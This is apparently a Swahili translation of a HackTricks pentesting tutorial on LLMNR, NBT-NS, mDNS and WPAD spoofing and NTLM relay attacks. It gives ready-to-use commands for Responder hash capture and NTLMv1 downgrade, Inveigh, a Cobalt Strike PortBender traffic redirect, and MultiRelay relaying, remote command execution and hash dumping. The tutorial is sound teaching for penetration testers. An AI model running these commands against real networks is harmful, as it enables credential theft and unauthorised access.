# Kudanganya LLMNR, NBT-NS, mDNS/DNS na WPAD na Mashambulizi ya Kusambaza

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Itifaki za Mtandao

### Itifaki za Azimio la Mwenyeji wa Ndani
- **LLMNR, NBT-NS, na mDNS**:
- Microsoft na mifumo mingine ya uendeshaji hutumia LLMNR na NBT-NS kwa azimio la majina ya ndani wakati DNS inashindwa. Vivyo hivyo, mifumo ya Apple na Linux hutumia mDNS.
- Itifaki hizi zinaweza kudukuliwa na kudanganywa kutokana na asili yao ya kutokuwa na uthibitisho, utangazaji kupitia UDP.
- [Responder](https://github.com/lgandx/Responder) inaweza kutumika kuiga huduma kwa kutuma majibu bandia kwa watumiaji wanaouliza itifaki hizi.
- Maelezo zaidi juu ya kuiga huduma kwa kutumia Responder yanaweza kupatikana [hapa](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Itifaki ya Ugunduzi wa Kiotomatiki wa Wavuti (WPAD)
- WPAD inaruhusu vivinjari kugundua mipangilio ya wakala kiotomatiki.
- Ugunduzi unafanikishwa kupitia DHCP, DNS, au kurudi kwa LLMNR na NBT-NS ikiwa DNS inashindwa.
- Responder inaweza kufanya mashambulizi ya WPAD kiotomatiki, kuongoza wateja kwenye seva za WPAD zenye nia mbaya.

### Responder kwa Sumu ya Itifaki
- **Responder** ni zana inayotumiwa kwa kudanganya LLMNR, NBT-NS, na mDNS, majaribio ya kujibu kwa kuzingatia aina za maswali, hasa kulenga huduma za SMB.
- Inakuja tayari imewekwa kwenye Kali Linux, inaweza kusanidiwa kwenye `/etc/responder/Responder.conf`.
- Responder inaonyesha hash zilizochukuliwa kwenye skrini na kuziokoa kwenye saraka ya `/usr/share/responder/logs`.
- Inasaidia IPv4 na IPv6.
- Toleo la Windows la Responder linapatikana [hapa](https://github.com/lgandx/Responder-Windows).

#### Kuendesha Responder
- Kuanza Responder na mipangilio ya msingi: `responder -I <Interface>`
- Kwa uchunguzi wenye nguvu zaidi (na athari za upande): `responder -I <Interface> -P -r -v`
- Mbinu za kukamata changamoto/majibu ya NTLMv1 kwa kufanya uchakataji rahisi: `responder -I <Interface> --lm --disable-ess`
- Udanganyifu wa WPAD unaweza kuamilishwa na: `responder -I <Interface> --wpad`
- Maombi ya NetBIOS yanaweza kutatuliwa kwa anwani ya IP ya mshambuliaji, na wakala wa uwakiki unaweza kuwekwa: `responder.py -I <interface> -Pv`

### Sumu ya DHCP na Responder
- Kudanganya majibu ya DHCP kunaweza kudhuru habari za mwelekeo wa muathirika kwa kudumu, kutoa mbadala wa siri kwa sumu ya ARP.
- Inahitaji ufahamu sahihi wa usanidi wa mtandao wa lengo.
- Kuendesha shambulio: `./Responder.py -I eth0 -Pdv`
- Njia hii inaweza kukamata hash za NTLMv1/2 kwa ufanisi, lakini inahitaji kushughulikia kwa uangalifu ili kuepuka kuvuruga mtandao.

### Kukamata Vitambulisho kwa Kutumia Responder
- Responder itajifanya kuwa huduma kwa kutumia itifaki zilizotajwa hapo juu, kukamata vitambulisho (kawaida NTLMv2 Challenge/Response) wakati mtumiaji anajaribu kuthibitisha utambulisho dhidi ya huduma zilizodanganywa.
- Jaribio linaweza kufanywa kushusha hadhi hadi NetNTLMv1 au kulemaza ESS ili kufanya uchakataji wa vitambulisho kuwa rahisi.

Ni muhimu kuzingatia kuwa kutumia mbinu hizi lazima ifanyike kwa njia halali na kimaadili, kuhakikisha idhini sahihi na kuepuka kuvuruga au kupata ufikiaji usioidhinishwa.

## Inveigh

Inveigh ni zana kwa wataalamu wa uchunguzi wa kuingilia na timu nyekundu, iliyoundwa kwa mifumo ya Windows. Inatoa utendaji kama Responder, kufanya mashambulizi ya kudanganya na kati ya mtu. Zana hii imebadilika kutoka kwa script ya PowerShell hadi faili ya C#, na [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) na [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) kama toleo kuu. Maelezo ya kina ya vigezo na maelekezo yanaweza kupatikana kwenye [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh inaweza kutumiwa kupitia PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Au kutekelezwa kama faili ya C#:
```bash
Inveigh.exe
```
### Shambulizi la NTLM Relay

Shambulizi hili linatumia vikao vya uwakilishi wa SMB kufikia kompyuta ya lengo, ikitoa kikao cha mfumo ikiwa mafanikio. Mahitaji muhimu ni pamoja na:
- Mtumiaji anayethibitisha lazima awe na Ufikiaji wa Msimamizi wa Ndani kwenye mwenyeji uliopokea.
- Kusainiwa kwa SMB inapaswa kuwa imelemazwa.

#### Kusambaza na Kuficha Bandari 445

Katika hali ambapo utangulizi wa mtandao moja kwa moja haufanikiwi, trafiki kwenye bandari 445 inahitaji kusambazwa na kufichwa. Zana kama [**PortBender**](https://github.com/praetorian-inc/PortBender) husaidia kuelekeza trafiki ya bandari 445 kwenye bandari nyingine, ambayo ni muhimu wakati ufikiaji wa msimamizi wa ndani unapatikana kwa kupakia dereva.

Usanidi na uendeshaji wa PortBender katika Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Vifaa Vingine kwa Shambulio la NTLM Relay

- **Metasploit**: Imewekwa na maelezo ya wakala, mwenyeji wa ndani na wa mbali.
- **smbrelayx**: Skrini ya Python kwa kusambaza vikao vya SMB na kutekeleza amri au kuweka mlango wa nyuma.
- **MultiRelay**: Zana kutoka kwenye seti ya Responder kwa kusambaza watumiaji maalum au watumiaji wote, kutekeleza amri, au kudondosha hash.

Kila zana inaweza kusanidiwa kufanya kazi kupitia wakala wa SOCKS ikiwa ni lazima, kuruhusu mashambulizi hata na ufikiaji wa mtandao usio wa moja kwa moja.

### Uendeshaji wa MultiRelay

MultiRelay inatekelezwa kutoka kwenye saraka ya _**/usr/share/responder/tools**_, ikilenga anwani za IP au watumiaji maalum.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Zana na mbinu hizi hufanya seti kamili ya kufanya mashambulizi ya NTLM Relay katika mazingira mbalimbali ya mtandao.

### Kulazimisha Kuingia kwa NTLM

Katika Windows, **unaweza kuwalazimisha baadhi ya akaunti zenye mamlaka kuthibitisha kwenye mashine zisizo halali**. Soma ukurasa ufuatao ili kujifunza jinsi:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Marejeo
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
